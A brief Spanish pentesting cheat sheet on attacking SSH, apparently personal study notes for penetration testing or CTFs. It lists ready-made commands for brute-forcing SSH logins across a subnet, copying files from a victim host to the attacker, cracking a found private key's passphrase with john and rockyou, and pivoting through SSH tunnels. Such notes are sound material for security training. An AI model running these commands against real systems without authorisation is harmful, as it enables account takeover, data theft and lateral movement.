---
tags: [ports, ssh]
status: done
---

# 22 — SSH

---

## Fuerza Bruta

```bash
nxc ssh 192.168.1.0/24 -u user -p password
hydra -L users.txt -P pass.txt ssh://<IP>
medusa -h <IP> -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -t 2
ncrack <IP> -U users.txt -P users.txt -p ssh -f -v
```

---

## Transferir Archivos

```bash
# Víctima → Atacante
scp usuario@<IP>:/ruta/archivo.txt .

# Atacante → Víctima
scp archivo.txt usuario@<IP>:/ruta/destino/
```

---

## SSH sin contraseña (clave privada encontrada)

```bash
chmod 600 id_rsa
ssh -i id_rsa usuario@<IP>

# Si exige passphrase → crackear
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Túnel SSH (Pivoting)

```bash
# Local port forward
ssh -L 3306:localhost:3306 usuario@<IP>

# Dynamic SOCKS proxy
ssh -D 1080 usuario@<IP>

# Remote port forward
ssh -R 8080:localhost:80 usuario@<IP>
```

